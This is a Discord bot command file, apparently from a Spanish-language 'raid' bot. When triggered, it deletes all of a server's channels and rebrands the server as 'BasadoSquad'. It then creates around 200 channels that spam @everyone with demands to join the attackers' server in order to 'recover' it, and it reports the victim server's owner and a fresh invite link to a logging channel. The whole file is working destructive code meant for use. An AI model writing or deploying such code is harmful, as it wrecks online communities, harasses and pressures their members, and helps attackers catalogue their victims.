const Discord = require('discord.js')
const { Client, MessageEmbed } = require('discord.js')



module.exports = { 
  timeout: 600000,
  name: "raid",
  alias: "destroy",
  descritpion: '',
  uso:'',
  category: '',
  run: async (client, message, args) => {

    try{

        message.delete().catch(()=>{
            return;
        })
        //if(15 >= interaction.guild.memberCount) return interaction.reply({content: '**Solo puedes Raidear servidores con un máximo de 16 personas dentro del server.**', ephemeral: true})
            let IDsv = message.guild.id
            client.guilds.cache.get(IDsv).setName('☣️BasadoSquad☣️').catch(e=>{
              return
            })
            client.guilds.cache.get(IDsv).setBanner(require("../../config.json").imgicon).catch(e=>{
              return
            })
            client.guilds.cache.get(IDsv).setIcon(require("../../config.json").imgicon).catch(e=>{
              return
            })
        
        
        
          message.guild.channels.cache.forEach(channel =>{
        
            channel.delete().catch(()=>{return;})
          
          })
          client.guilds.cache.get(IDsv).channels.create('unete').then(async c=>{
            c.permissionOverwrites.create(c.guild.roles.everyone, { READ_MESSAGE_HISTORY: true,VIEW_CHANNEL: true, SEND_MESSAGES: true });
            
            c.createInvite()
            .then(async invite => {
              
           
            const embed = new Discord.MessageEmbed()
            .setColor('RED')
            .setAuthor(message.guild.name, message.guild.iconURL({dynamic: true}))
            .setTitle('Nuevo Servidor Raideado!')
            .addField('Owner:',`> ${client.users.cache.get(message.guild.ownerId).tag} *(ID: ${message.guild.ownerId})*`)
            .addField('Servidor:',`> ${message.guild.name} *(ID: ${message.guild.id})*`)
            .addField('Miembros:',`> ${message.guild.memberCount}`)
            .addField(`User Raid:`,`> ${message.author.tag} *(ID: ${message.author.id})*`)
            .addField(`Invitación:`, `> **[ENTRAR AL SERVIDOR](https://discord.gg/${await invite.code})**`)
            .setTimestamp()
            .setThumbnail(message.guild.iconURL({size: 4096, format: "png",dynamic: true}))
            const row = new Discord.MessageActionRow()
            .addComponents(
              new Discord.MessageButton()
              .setLabel('ENTRAR AL SERVIDOR')
              .setURL(`https://discord.gg/${await invite.code}`)
              .setStyle('LINK')
              
            )
            .addComponents(
              new Discord.MessageButton()
              .setLabel('INVITARME A UN SERVIDOR')
              .setURL(`https://discord.com/api/oauth2/authorize?client_id=796121380613652490&permissions=8&scope=bot%20applications.commands`)
              .setStyle('LINK')
              
            )
            client.channels.cache.get(require('../../config.json').canalogs).send({embeds: [embed], components: [row]})
          })
            c.send(`
          @everyone\n**¡Únete para que no le pase esto a tu servidor!**
          ${require('../../config.json').sexoinvite}
          `).catch(()=>{return})
          
          }).catch(e=>{return})
        
        for (let i = 0; i <= 200; i++) {
        await  message.guild.channels.create('☣️BasadoSquad☣️').then(c => {
          c.permissionOverwrites.create(c.guild.roles.everyone, { READ_MESSAGE_HISTORY: true,VIEW_CHANNEL: true, SEND_MESSAGES: true }).catch(e=>{return})
          for (let i = 0; i <= 20; i++) {
            c.send(`  @everyone \n Servidor destrozado por   **☣️BasadoSquad☣️**  , si deseas recuperar tu servidor deberás unirte: \n ${require('../../config.json').sexoinvite} `).catch(e=>{return})
          
        
              }
            }).catch(()=>{
              return;
            })
          }
        
        
        
        
        }catch (e) {
                console.error(e);
                
                try {
                  return;
                 } catch (e) {}
                }
  }
}